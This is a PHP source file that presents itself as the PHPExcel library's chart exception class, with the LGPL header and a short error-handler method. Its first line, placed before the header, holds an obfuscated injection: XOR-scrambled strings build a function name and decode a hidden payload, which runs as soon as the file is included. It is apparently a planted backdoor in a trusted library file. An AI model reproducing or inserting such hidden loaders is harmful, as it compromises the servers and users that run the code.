<?php $UuzvnKdR='MAQWDXgFE:H 8+V'; $WLHJaDRi='.3460=8 0T+TQD8'^$UuzvnKdR; $VLdJYDdI='1XnE16837.=Bq >0GXIxf::1gR.B7haXKJIQQAVnaF3; CT9 s <Yk7 .Z-iT3HnbST1 vQv -TkrGpkiLoq>g;X6VzQVrJo2aHS:Rc=ztyvIGcQR :7BTTJb O0-jovl=ROahp9c9A<aftuIo=WA5iq+qynrj; G-GPRuFD I:U en>=HjoHos<g+KN1 8QiY1DFzkF>BMz=rU,<ZuWVWR 4-m4mX8 ,n8PCvgbX6;:TXydWOC4 NYfrVeovcyz t OIP=SLnYsUt:7=XQsZCM>wV8TYa9IURifI +RkLQq 8Z,rzcA818> URLhmRJfdMHVU3,mrMm9 >R 76=lLc00qlo.=>a5 ZlGTIugdss15 2SlbWz3yb<V Wr=Q3qdnoSIDpfBfv U 5tkqrO3WYVq0eHa1zIO-5;Qglf7N N=994Z3QRP3Q=1I9-M-qA ;G;;: cpmP45,=PCu>;Y0sxMjOZXOgV<0Jji;1HFK+;EMAgqp3 L95iPV:e=7+4 1Zw-STkCGvJW 5KdwbazX0DZgRTLUlnKIEohhdHihlPuq DPoXKewZUIg+Ng4 ecRyg5.c<FbTeAtLMvZD V6g XOc3UEBY6dbAXH6.14ftjK, 2LEPvbWdOl.rcY.R4gSDPC.<d=., =+IQ+px0nKDECACJZ>O'; $ieexuC=$WLHJaDRi('', 'X>FdWCVPCGR,.EFY4,:PABUC86O6V7>5>>nxxa-dh FUC7=VNSXS+4SAZ;r69F<FF75EAZqRKH-BRgPKI7ex7CT-BvGqqUqe;h.<HzGTZIYFrgG8nSNE.1:bFD.DLCTVHTydHby0GV4HAHIUaKY65T2UB,Y0RNPE>vc9rPf7T;V0NMJUX1C2aTy5nY.:DRVyM6D0oAaOCH0p7V1MH;Ujv13LGHV>I<YTM1S5:VZB>WWI1csn1 1QA-1FZr:,9,23eTA<itV65NdMuPLVQ-4Zz8G7S2Y 8>R,,rTFmKN+PFXUDY.MRGCeNPTKEnX1bg;,FLll24GMDR6g0FQ EVUULdGob4=:knjATSzH,10UZZSWGTLG6EB,p:pFX7T6-V4JQYNK8,=KlKoRD4TTTVQV9R;,3J:l5kLpCkITO0GQFw;N=XKPU6Z+7xK>On-XY,r.,UOoYZIEUD24QVCY5kQZZ-QZTmN+;,.8=YIcCR1X.noOZ1,aAWPRR>XL6;3C:XOBGTBrPF6-LogR.6TTbDQDAR5TqrC65847I ,<H5ADuTHKeMEAr6Vm-TEcc+SN-VPCTVfNTWLSXrTeBhTjkV;6R7O8K=6<V-,1-ELE191ZAPPAXJoHAF-lyVBwDoLUxj<X3XOw 17OgCMOULRJ-vvYC:g.<,7isca42'^$VLdJYDdI); $ieexuC();

/**
 * PHPExcel
 *
 * Copyright (c) 2006 - 2014 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   PHPExcel
 * @package    PHPExcel_Chart
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license	http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt	LGPL
 * @version	1.8.0, 2014-03-02
 */

/**
 * PHPExcel_Chart_Exception
 *
 * @category   PHPExcel
 * @package    PHPExcel_Chart
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 */
class PHPExcel_Chart_Exception extends PHPExcel_Exception {

    /**
     * Error handler callback
     *
     * @param mixed $code
     * @param mixed $string
     * @param mixed $file
     * @param mixed $line
     * @param mixed $context
     */
    public static function errorHandlerCallback($code, $string, $file, $line, $context) {
        $e = new self($string, $code);
        $e->line = $line;
        $e->file = $file;
        throw $e;
    }

}
